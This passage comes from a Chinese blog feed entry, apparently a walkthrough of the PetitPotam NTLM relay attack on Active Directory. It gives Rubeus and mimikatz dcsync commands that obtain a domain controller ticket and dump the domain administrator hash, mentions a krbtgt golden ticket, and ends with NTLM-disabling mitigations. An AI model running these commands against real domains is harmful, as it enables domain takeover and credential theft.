alt=""></p><p>利用Rubeus获取TGT导入到当前进程</p><pre><code>Rubeus.exe asktgt /outfile:kirbi /user:WIN-0ASLVBO5ID9$ /ptt /certificate:&lt;Base64&gt; #这里的/user为/user:&lt;DC的机器名&gt;$</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2fBT.png" alt=""></p><p>利用mimikatz导出域管哈希</p><pre><code>lsadump::dcsync /user:Administrator</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2IN4.png" alt=""></p><p>wmicexec.py连接即可<br><img src="https://z3.ax1x.com/2021/08/07/fMRPgI.png" alt=""></p><p>或者也可以dump krbtgt的hash生成金票<br><img src="https://z3.ax1x.com/2021/08/07/fMRADf.png" alt=""></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>IIS关闭NTLM验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRK8s.png" alt=""></p><p>只允许kerberos验证<br><img src="https://z3.ax1x.com/2021/08/07/fMR1K0.png" alt=""></p><p>GPO关闭NTLM身份验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRJVU.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/" target="_blank" rel="noopener">https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/</a><br><a href="https://www.youtube.com/watch?v=K0N90sI_GhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=K0N90sI_GhI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;最近披露的几个漏洞，分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MS-EFSRPC – 又名 PetitPotam&lt;/li</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
</feed>
